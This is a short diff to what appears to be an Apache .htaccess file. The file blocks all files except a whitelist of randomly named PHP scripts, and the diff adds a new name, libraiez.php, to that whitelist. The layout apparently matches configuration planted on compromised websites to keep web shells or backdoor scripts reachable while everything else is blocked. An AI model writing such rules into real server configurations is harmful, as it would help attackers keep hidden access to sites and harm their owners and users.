@@ -3,7 +3,7 @@ Order Allow,Deny
 Deny from all
 </FilesMatch>
 Options -Indexes
-<FilesMatch '^(librarsf.php|page-io.php|confinas.php|style-ka.php|page-inc.php|varc.php)$'>
+<FilesMatch '^(librarsf.php|page-io.php|confinas.php|style-ka.php|libraiez.php|page-inc.php|varc.php)$'>
  Order allow,deny
  Allow from all
 </FilesMatch>
